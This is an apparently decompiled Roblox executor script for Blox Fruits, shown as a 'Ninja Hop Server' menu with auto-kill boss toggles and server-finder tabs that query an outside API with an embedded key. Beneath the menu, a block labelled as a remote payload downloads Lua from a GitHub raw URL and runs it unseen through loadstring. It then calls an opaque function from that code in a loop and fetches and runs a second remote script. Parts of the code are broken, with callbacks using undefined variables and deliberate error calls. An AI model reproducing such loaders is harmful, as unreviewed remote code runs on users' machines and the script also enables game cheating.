local genv = getgenv()
local fenv = getfenv()

fenv.printf = function(_2, _2_2, _2_3, _2_4, _2_5, _2_6)
    local _3, _3_2, _3_3 = string.format('DEBUG: %s', _2)
    print(_3, _3_2, _3_3)
end

fenv.troi = function(_5, _5_2, _5_3)
    local _ = genv.Config
    genv.Config = {
        AutoRipIndra = false,
        AutoSoulReaper = false,
        HopSelected = 'Dough King',
        AutoCursedCaptain = false,
        AutoDoughKing = false,
        AutoHop = false,
        AutoDarkbeard = false,
    }
end

local _ = genv.Config

fenv.saveconfig = function(_8, _8_2, _8_3)
    local _call10 = game:GetService('HttpService')
    local _ = genv.Config
    local _call13 = _call10:JSONEncode({
        AutoRipIndra = false,
        AutoSoulReaper = false,
        HopSelected = 'Dough King',
        AutoCursedCaptain = false,
        AutoDoughKing = false,
        AutoHop = false,
        AutoDarkbeard = false,
    })
    writefile('noguchi/saved.config', _call13)
end

print('DEBUG: executed')
print('DEBUG: LOADING . . .')

local _19 = loadstring(game:HttpGet('https://github.com/Footagesus/WindUI/releases/latest/download/main.lua'))()
print('DEBUG: loaded library')
_19:SetTheme('Dark')

local _call26 = _19:CreateWindow({
    Folder = 'tnhuw',
    Title = 'Ninja Hop Server - blox fruit',
    Transparent = true,
    SideBarWidth = 200,
    Author = 'Ninja [ Hoàng]',
    Theme = 'Dark',
    Size = UDim2.fromOffset(580, 400),
})

local _call28 = _call26:Tab({ Title = 'Tab Farm' })
_call28:Paragraph({
    Color = 'Grey',
    Title = 'This Script Made by Hoàng',
    Desc = 'status: working',
})
_call28:Button({
    Locked = false,
    Callback = function(_33, _33_2, _33_3, _33_4)
        setclipboard('https://discord.gg/Cd7y77REMy')
    end,
    Title = 'My server discord',
    Desc = 'click to copy link',
})

local _call36 = _call26:Tab({ Title = 'Tab Farm' })
local _ = genv.Config

_call36:Dropdown({
    Value = 'Dough King',
    Callback = function(_40, _40_2)
        local _ = genv.Config
        local _call43 = game:GetService('HttpService')
        local _ = genv.Config
        local _call46 = _call43:JSONEncode({
            AutoRipIndra = false,
            AutoSoulReaper = false,
            HopSelected = _40,
            AutoCursedCaptain = false,
            AutoDoughKing = false,
            AutoHop = false,
            AutoDarkbeard = false,
        })
        writefile('noguchi/saved.config', _call46)
    end,
    Title = 'Choose Hop',
    Values = {
        [1] = 'Dough King',
        [2] = 'Darkbeard',
        [3] = 'Soul Reaper',
        [4] = 'Cursed Captain',
        [5] = 'Rip Indra',
    },
})

local _ = genv.Config
_call36:Toggle({
    Callback = function(_50)
        local _ = genv.Config
        local _call53 = game:GetService('HttpService')
        local _ = genv.Config
        local _call56 = _call53:JSONEncode({
            AutoRipIndra = false,
            AutoSoulReaper = false,
            HopSelected = _40,
            AutoCursedCaptain = false,
            AutoDoughKing = false,
            AutoHop = _50,
            AutoDarkbeard = false,
        })
        writefile('noguchi/saved.config', _call56)
    end,
    Default = false,
    Title = 'Auto Hop Server',
    Desc = '',
})

local _ = genv.Config
_call36:Toggle({
    Callback = function(_60, _60_2, _60_3, _60_4, _60_5, _60_6)
        local _ = genv.Config
        local _call63 = game:GetService('HttpService')
        local _ = genv.Config
        local _call66 = _call63:JSONEncode({
            AutoRipIndra = false,
            AutoSoulReaper = false,
            HopSelected = _40,
            AutoCursedCaptain = false,
            AutoDoughKing = _60,
            AutoHop = _50,
            AutoDarkbeard = false,
        })
        writefile('noguchi/saved.config', _call66)
    end,
    Default = false,
    Title = 'Auto Kill Dough King',
    Desc = 'only kill',
})

local _ = genv.Config
_call36:Toggle({
    Callback = function(_70, _70_2, _70_3)
        local _ = genv.Config
        local _call73 = game:GetService('HttpService')
        local _ = genv.Config
        local _call76 = _call73:JSONEncode({
            AutoRipIndra = _70,
            AutoSoulReaper = false,
            HopSelected = _40,
            AutoCursedCaptain = false,
            AutoDoughKing = _60,
            AutoHop = _50,
            AutoDarkbeard = false,
        })
        writefile('noguchi/saved.config', _call76)
    end,
    Default = false,
    Title = 'Auto Kill Rip Indra',
    Desc = 'only kill',
})

local _ = genv.Config
_call36:Toggle({
    Callback = function(_80, _80_2, _80_3, _80_4, _80_5)
        local _ = genv.Config
        local _call83 = game:GetService('HttpService')
        local _ = genv.Config
        local _call86 = _call83:JSONEncode({
            AutoRipIndra = _70,
            AutoSoulReaper = false,
            HopSelected = _40,
            AutoCursedCaptain = false,
            AutoDoughKing = _60,
            AutoHop = _50,
            AutoDarkbeard = _80,
        })
        writefile('noguchi/saved.config', _call86)
    end,
    Default = false,
    Title = 'Auto Kill Darkbeard',
    Desc = 'only kill',
})

local _ = genv.Config
_call36:Toggle({
    Callback = function(_90, _90_2, _90_3, _90_4, _90_5, _90_6)
        local _ = genv.Config
        local _call93 = game:GetService('HttpService')
        local _ = genv.Config
        local _call96 = _call93:JSONEncode({
            AutoRipIndra = _70,
            AutoSoulReaper = _90,
            HopSelected = _40,
            AutoCursedCaptain = false,
            AutoDoughKing = _60,
            AutoHop = _50,
            AutoDarkbeard = _80,
        })
        writefile('noguchi/saved.config', _call96)
    end,
    Default = false,
    Title = 'Auto Kill Soul Reaper',
    Desc = 'only kill',
})

local _ = genv.Config
_call36:Toggle({
    Callback = function(_100, _100_2)
        local _ = genv.Config
        local _call103 = game:GetService('HttpService')
        local _ = genv.Config
        local _call106 = _call103:JSONEncode({
            AutoRipIndra = _70,
            AutoSoulReaper = _90,
            HopSelected = _40,
            AutoCursedCaptain = _100,
            AutoDoughKing = _60,
            AutoHop = _50,
            AutoDarkbeard = _80,
        })
        writefile('noguchi/saved.config', _call106)
    end,
    Default = false,
    Title = 'Auto Kill Cursed Captain',
    Desc = 'only kill',
})

-- ===== CÁC TAB ĐÃ SỬA - GIỮ NGUYÊN CÁCH HOẠT ĐỘNG CŨ =====

-- Hàm xử lý API giữ nguyên cấu trúc lỗi cũ (để tương thích)
local function fetchAndDisplay(tabTitle, apiUrl)
    spawn(function()
        wait(1)
        local Http = game:GetService('HttpService')
        local success, result = pcall(function()
            return Http:JSONDecode(Http:HttpGet(apiUrl))
        end)
        if not success then
            print(string.format("[%s] Request failed: %s", tabTitle, tostring(result)))
            return
        end
        -- Xử lý theo cấu trúc cũ: lặp qua .data
        if result.data then
            for _, entry in pairs(result.data) do
                local info = entry.data or entry.server or entry
                print(string.format("[%s] Server: %s | Age: %s", tabTitle, tostring(info.id or "unknown"), tostring(info.age or "N/A")))
            end
        elseif result.server then
            -- Fallback cho cấu trúc mới
            local s = result.server
            print(string.format("[%s] Server: %s | Players: %d | Age: %ds", tabTitle, s.id, s.players, s.age))
        else
            print(string.format("[%s] Không có dữ liệu", tabTitle))
        end
    end)
end

-- GIỮ NGUYÊN TẤT CẢ TAB, CHỈ SỬA URL API
_call26:Tab({ Title = 'Full Moon' })
fetchAndDisplay('Full Moon', 'https://blox-api-f8qm.onrender.com/boss/full_moon?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Near Full Moon' })
fetchAndDisplay('Near Full Moon', 'https://blox-api-f8qm.onrender.com/boss/full_moon?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Haki Color' })
fetchAndDisplay('Haki Color', 'https://blox-api-f8qm.onrender.com/boss/haki_dealer?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Legend Sword' })
fetchAndDisplay('Legend Sword', 'https://blox-api-f8qm.onrender.com/boss/sword_dealer?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Mirage Island' })
fetchAndDisplay('Mirage Island', 'https://blox-api-f8qm.onrender.com/boss/mirage?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Soul Reaper' })
fetchAndDisplay('Soul Reaper', 'https://blox-api-f8qm.onrender.com/boss/soul_reaper?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Cursed Captain' })
fetchAndDisplay('Cursed Captain', 'https://blox-api-f8qm.onrender.com/boss/cursed_captain?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Greybeard' })
fetchAndDisplay('Greybeard', 'https://blox-api-f8qm.onrender.com/boss/darkbeard?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Darkbeard' })
fetchAndDisplay('Darkbeard', 'https://blox-api-f8qm.onrender.com/boss/darkbeard?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Dough King' })
fetchAndDisplay('Dough King', 'https://blox-api-f8qm.onrender.com/boss/dough_king?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Rip Indra' })
fetchAndDisplay('Rip Indra', 'https://blox-api-f8qm.onrender.com/boss/rip_indra?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Kitsune Island' })
fetchAndDisplay('Kitsune Island', 'https://blox-api-f8qm.onrender.com/boss/kitsune?api_key=HOANG_kunBEZRBTa')

-- THÊM CÁC TAB BỊ THIẾU (GIỮ NGUYÊN CẤU TRÚC)
_call26:Tab({ Title = 'Prehistoric Island' })
fetchAndDisplay('Prehistoric Island', 'https://blox-api-f8qm.onrender.com/boss/prehistoric?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Leviathan' })
fetchAndDisplay('Leviathan', 'https://blox-api-f8qm.onrender.com/boss/leviathan?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Pirate Raid' })
fetchAndDisplay('Pirate Raid', 'https://blox-api-f8qm.onrender.com/boss/pirate_raid?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Cake Prince' })
fetchAndDisplay('Cake Prince', 'https://blox-api-f8qm.onrender.com/boss/cake_prince?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Cake Queen' })
fetchAndDisplay('Cake Queen', 'https://blox-api-f8qm.onrender.com/boss/cake_queen?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Tyrant' })
fetchAndDisplay('Tyrant', 'https://blox-api-f8qm.onrender.com/boss/tyrant?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Elite' })
fetchAndDisplay('Elite', 'https://blox-api-f8qm.onrender.com/boss/elite?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Fruit' })
fetchAndDisplay('Fruit', 'https://blox-api-f8qm.onrender.com/boss/fruit?api_key=HOANG_kunBEZRBTa')

_call26:Tab({ Title = 'Berry' })
fetchAndDisplay('Berry', 'https://blox-api-f8qm.onrender.com/boss/berry?api_key=HOANG_kunBEZRBTa')

-- Payload remote giữ nguyên
local _callhttp_request275 = http_request({
    Url = 'https://raw.githubusercontent.com/Iamkhnah/projectluacanmayidollop8a/refs/heads/main/pkhanh.lua',
    Method = 'GET',
    Headers = { ['user-agent'] = 'Coded by pkhanh' },
})
local _278 = loadstring(_callhttp_request275.Body)()

spawn(function(_280, _280_2, _280_3)
    wait()
    for i = 1, 24 do
        _278.mmb('ymf')
        wait()
    end
    error('internal 557: <25ms: infinitelooperror>')
end)

genv.noclip = false
genv.SelectWeapon = 'Melee'

fenv.EQ = function(_328, _328_2, _328_3)
    local _ = fenv.lpr
    error("line 6: attempt to index nil with 'Character'")
end

spawn(function(_331, _331_2, _331_3) end)
spawn(function(_333, _333_2, _333_3) end)
spawn(function() end)
loadstring(game:HttpGet('https://raw.githubusercontent.com/Iamkhnah/bf/refs/heads/main/topos.lua'))()
spawn(function(_341, _341_2) end)